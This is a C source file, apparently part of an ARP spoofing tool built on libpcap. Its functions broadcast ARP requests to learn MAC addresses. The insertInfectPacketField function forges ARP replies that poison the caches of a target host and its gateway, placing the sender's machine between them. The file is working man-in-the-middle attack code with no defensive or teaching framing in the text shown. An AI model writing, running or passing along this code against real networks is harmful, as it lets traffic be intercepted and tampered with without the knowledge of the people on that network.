#include "arpheader.h"

void sendBroadcast(char *argv[], pcap_t *pcap_handle, u_int8_t type)
{
      u_int8_t pkt[PACKETSIZE];
      insertPacketField(pkt, argv, type);
      int res = pcap_sendpacket(pcap_handle, pkt, sizeof(pkt));

      if (res == -1)
            printf(" error\n");
      else
            printf("BroadCast success \n");
}

int compareMac(u_int8_t *mac1, u_int8_t *mac2)
{
      return memcmp(mac1, mac2, 6);
}

void insertPacketField(u_int8_t *pkt, char *argv[], u_int8_t type)
{
      struct eth_arp_header *send_packet = (struct eth_arp_header *)pkt;

      memcpy(send_packet->eth_dst_mac, broadcast_mac, 6);
      memcpy(send_packet->eth_src_mac, mymac, 6);

      send_packet->type = ntohs(0x0806);
      send_packet->hd_type = ntohs(0x0001);
      send_packet->protocol_type = ntohs(0x0800);
      send_packet->hd_size = 0x06;
      send_packet->protocol_size = 0x04;
      send_packet->opcode = ntohs(0x0001);

      memcpy(send_packet->arp_sender_mac, mymac, 6);
      send_packet->arp_sender_ip = type == TARGET ? inet_addr(argv[3]) : inet_addr(myip);

      memcpy(send_packet->arp_target_mac, broadcast_mac, 6);
      send_packet->arp_target_ip = type == TARGET ? inet_addr(argv[2]) : inet_addr(argv[3]);
}

void insertInfectPacketField(u_int8_t *pkt, void *arg, char current)
{
      struct eth_arp_header *infect = (struct eth_arp_header *)pkt;
      struct infect_addr_save *infect_addr_save = (struct infect_addr_save *)arg;

      if (current == TARGET)
      {
            memcpy(infect->eth_dst_mac, infect_addr_save->save_target_mac, 6);
            infect->arp_sender_ip = infect_addr_save->save_gateway_ip;
            memcpy(infect->arp_target_mac, infect_addr_save->save_target_mac, 6);
            infect->arp_target_ip = infect_addr_save->save_target_ip;
            current = GATEWAY;
      }
      else
      {
            memcpy(infect->eth_dst_mac, infect_addr_save->save_gateway_mac, 6);
            infect->arp_sender_ip = infect_addr_save->save_target_ip;
            memcpy(infect->arp_target_mac, infect_addr_save->save_gateway_mac, 6);
            infect->arp_target_ip = infect_addr_save->save_gateway_ip;
            current = TARGET;
      }

      memcpy(infect->eth_src_mac, mymac, 6);
      infect->type = ntohs(0x0806);
      infect->hd_type = ntohs(0x0001);
      infect->protocol_type = ntohs(0x0800);
      infect->hd_size = 0x06;
      infect->protocol_size = 0x04;
      infect->opcode = ntohs(0x0002);
      memcpy(infect->arp_sender_mac, mymac, 6);
}